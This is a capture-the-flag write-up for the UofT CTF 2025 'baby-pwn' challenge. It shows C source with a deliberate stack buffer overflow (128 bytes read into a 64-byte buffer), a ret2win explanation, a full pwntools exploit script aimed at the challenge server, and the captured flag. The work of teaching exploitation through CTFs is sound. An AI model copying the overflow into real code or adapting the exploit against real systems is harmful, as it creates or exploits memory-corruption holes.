---
layout: writeup
category: UofT-CTF-2025
chall_description: 
points: 100
solves: 459
tags: UofT-CTF-2025 pwn pwn/buffer-overflow pwn/ret2win
date: 2025-1-12
comments: false
---

Here's a baby pwn challenge for you to try out. Can you get the flag?

nc 34.162.142.123 5000

Author: atom

[baby-pwn.zip](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UofT-CTF-2025/baby-pwn.zip)  

---

We're provided the binary along with the source file:  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void secret()
{
    printf("Congratulations! Here is your flag: ");
    char *argv[] = {"/bin/cat", "flag.txt", NULL};
    char *envp[] = {NULL};
    execve("/bin/cat", argv, envp);
}

void vulnerable_function()
{
    char buffer[64];
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
    printf("You entered: %s\n", buffer);
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Welcome to the Baby Pwn challenge!\n");
    printf("Address of secret: %p\n", secret);
    vulnerable_function();
    printf("Goodbye!\n");
    return 0;
}
```

No need to even look at the binary's protections here -- this is a simple, easy ret2win.  

We have a buffer overflow on `buffer`, allowing us to overwrite the saved RIP, as 128 bytes are read into a 64 byte buffer. Also, he program leaks the address of `secret()`, so we can just write that to saved RIP!  

The exploit can be summed up in three lines:  

```py
# send(cyclic(128, n=8), b': ')
offset = cyclic_find('jaaaaaaa', n=8)
send(b'A'*offset + p64(elf.sym.secret), b': ')
```

The first (commented-out) line, when we run the binary with GDB attached, will give us the offset in our input where the saved RIP is. The next two lines use that information to overwrite the saved RIP with the address of `secret()` (turns out you don't even need the program's leak because the binary doesn't have the PIE protection enabled!)  

And we get the flag!  

	uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}

Full script (it's long because I made a pwn template for myself):  

```py
# Useful references:
# https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf

from pwn import *
import sys
import os

#---------HELPER FUNCTIONS---------#

def get_leak(before: bytes, end: bytes=b'\n') -> int:
    p.recvuntil(before)
    return int(p.recvuntil(end).decode('ascii')[:-1], 16)

def send(payload: bytes, before: bytes=b'', line: bool=True) -> int:
    payload = payload + (b'\n' if line else b'')
    if before == b'':
        p.send(payload)
    else:
        p.sendafter(before, payload)


#---------SETUP---------#

args = list(map(lambda s: s.upper(), sys.argv))
_libcs = list(filter(lambda s: 'libc.so.6' in s, os.listdir()))
_lds = list(filter(lambda s: 'ld' == s[:2], os.listdir()))

elf = ELF("baby-pwn") #------TODO------#
libc = _libcs[0] if len(_libcs) else elf.libc
ld = _lds[0] if len(_lds) else None

context.binary = elf
context.log_level = "DEBUG"

gdbscript = '''
# 
'''

if 'REMOTE' in args:
    p = remote('34.162.142.123', 5000) #------TODO------#
else:
    p = process([elf.path])
    gdb.attach(p, gdbscript=gdbscript)


###################################
#==========BEGIN EXPLOIT==========#
###################################

# send(cyclic(128, n=8), b': ')
offset = cyclic_find('jaaaaaaa', n=8)
send(b'A'*offset + p64(elf.sym.secret), b': ')

###################################
#===========END EXPLOIT===========#
###################################


p.interactive()
p.close()

# uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
```